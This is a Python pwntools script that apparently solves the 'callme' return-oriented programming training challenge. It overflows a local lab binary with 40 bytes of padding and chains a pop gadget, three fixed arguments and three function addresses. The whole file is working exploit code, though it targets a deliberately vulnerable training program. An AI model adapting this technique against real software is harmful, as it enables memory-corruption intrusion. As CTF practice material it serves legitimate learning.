from pwn import *
from sys import stdout

def main():
    # Build binary
    targetProcess = ELF("./3-callme")

    # Build ROP object
    gadgets         = [p64(4196668)]
    targetAddresses = [p64(4196128),
                       p64(4196160),
                       p64(4196080)]
    arguments       = [p64(16045690984833335023),
                       p64(14627333968358193854),
                       p64(14991902676702064653)]

    # Prepare payload
    payload = b"A"*40
    # This is like saying: "Jump to this address and use these arguments"
    payload += gadgets[0] + arguments[0] + arguments[1] + arguments[2] + targetAddresses[0]
    payload += gadgets[0] + arguments[0] + arguments[1] + arguments[2] + targetAddresses[1]
    payload += gadgets[0] + arguments[0] + arguments[1] + arguments[2] + targetAddresses[2]

    # Start process
    localProcess = process("./3-callme")

    # Advance process
    response = localProcess.recvuntil(b"> ")

    # Send payload
    localProcess.sendline(payload)

    stdout.write(f'{localProcess.recvall()}\n')

if __name__ == '__main__':
    main()
